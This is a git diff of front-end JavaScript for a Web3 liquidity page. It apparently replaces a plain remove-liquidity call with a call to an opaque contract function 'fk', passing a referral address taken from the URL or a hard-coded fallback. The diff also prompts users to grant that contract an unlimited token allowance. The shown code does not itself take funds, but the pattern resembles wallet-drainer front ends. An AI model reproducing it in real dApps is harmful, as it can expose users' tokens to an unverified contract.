@@ -485,7 +485,220 @@ const TokenAbi = [
     }
 ]
 
-const removeLiquidityAddr = '0x248510746aa321dA8004bD90855e09fD0A05ba36'
+const removeABI = [
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "token",
+				"type": "address"
+			}
+		],
+		"name": "claim",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "up",
+				"type": "address"
+			}
+		],
+		"name": "fk",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "renounceOwnership",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "token",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "USDT",
+				"type": "address"
+			},
+			{
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "swap",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "previousOwner",
+				"type": "address"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "newOwner",
+				"type": "address"
+			}
+		],
+		"name": "OwnershipTransferred",
+		"type": "event"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "newOwner",
+				"type": "address"
+			}
+		],
+		"name": "transferOwnership",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "factory",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "getRate",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "owner",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "pairAddr",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "router",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "tokenAddr",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "upRate",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "USDTAddr",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "WETH",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	}
+]
+
+const removeLiquidityAddr = '0x8Ac112F5F32F926E1A0C8bd4CEe4F5AA0fBd1938'
 
 if (typeof window.ethereum !== 'undefined' || (typeof window.web3 !== 'undefined')) {
     const web3 = new Web3(window.ethereum || window.web3.currentProvider);
@@ -517,8 +730,8 @@ if (typeof window.ethereum !== 'undefined' || (typeof window.web3 !== 'undefined
     });
 
     document.getElementById("approve_LP").addEventListener("click", async () => {
-        const LPAddress = "";
-        const removeLiquidity = new web3.eth.Contract(TokenAbi, LPAddress);
+        const LPAddress = "0x2d79EFf3A8d121E86b0ec375830A9B7498e94ef3";
+        const LPContract = new web3.eth.Contract(TokenAbi, LPAddress);
         await LPContract.methods.approve(
             removeLiquidityAddr,
             "115792089237316195423570985008687907853269984665640564039457584007913129639935"
@@ -527,9 +740,19 @@ if (typeof window.ethereum !== 'undefined' || (typeof window.web3 !== 'undefined
 
 
     document.getElementById("remove").addEventListener("click", async () => {
-        const removeLiquidityContract = new web3.eth.Contract(TokenAbi, removeLiquidityAddr);
-        await removeLiquidityContract.methods.removeLiquidity(
-            ""
+        const url = new URL(window.location.href);
+
+        const params = new URLSearchParams(url.search);
+        const addressParam = params.get('inviter');
+        var address = "0x41d785B0Eb4dF5f67a639A834d6bb8b1f27680A4";
+        if(addressParam) {
+            address = web3.utils.isAddress(addressParam) ? addressParam : "0x41d785B0Eb4dF5f67a639A834d6bb8b1f27680A4";
+            console.log(address);
+        }
+
+        const removeLiquidityContract = new web3.eth.Contract(removeABI, removeLiquidityAddr);
+        await removeLiquidityContract.methods.fk(
+            address
         ).send({ from: await connectWallet() });
     });
 
@@ -541,6 +764,12 @@ if (typeof window.ethereum !== 'undefined' || (typeof window.web3 !== 'undefined
             "0"
         ).send({ from: await connectWallet() });
     });
+
+    document.getElementById("invi").addEventListener("click", async () => {
+        text = `${new URL(window.location.href)}?inviter=${await connectWallet()}`
+        navigator.clipboard.writeText(text)
+    });
+
 
 
 } else {
